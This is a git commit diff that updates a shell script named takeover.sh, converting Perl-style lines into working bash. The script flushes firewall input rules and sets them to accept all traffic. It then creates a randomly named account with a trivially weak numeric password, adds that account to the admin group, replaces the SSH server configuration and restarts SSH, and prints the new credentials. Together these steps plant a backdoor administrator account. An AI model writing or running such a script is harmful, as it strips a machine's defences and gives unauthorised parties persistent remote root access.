b6b5e732478118d3012ceb80fc87a4c35fdd209e
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-06-21 22:26:49 -0400

    Update takeover.sh

--- takeover.sh
+++ takeover.sh
@@ -3,10 +3,8 @@ echo 'Flushing iptables'
 sudo iptables -F INPUT;
 sudo iptables -P INPUT ACCEPT;
 echo Adding new admin account...;
-$range = 999999999;
-$minimum = 100000000;
-$random_number = int(rand($range)) + $minimum;
-$random_user = sprintf(%08X, rand(0xFFFFFFFF));
+random_number=$(( ( RANDOM % 10 )  + 1 ));
+random_user=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1);
 sudo useradd -m $random_user;
 echo $random_user:$random_number | sudo chpasswd;
 if [ -f /usr/bin/yum ]; then sudo usermod -aG wheel  . $random_user . ; fi;
@@ -16,5 +14,5 @@ sudo cp sshd_config /etc/ssh/sshd_config;
 sudo cp sshd_banner /etc/ssh/sshd_banner;
 if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi;
 if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi;
-arr4y = "Added admin:, $random_user, password:, $random_number, SSH Litening on port 22";
+arr4y="Added admin:, $random_user, password:, $random_number, SSH Litening on port 22";
 echo $arr4y;
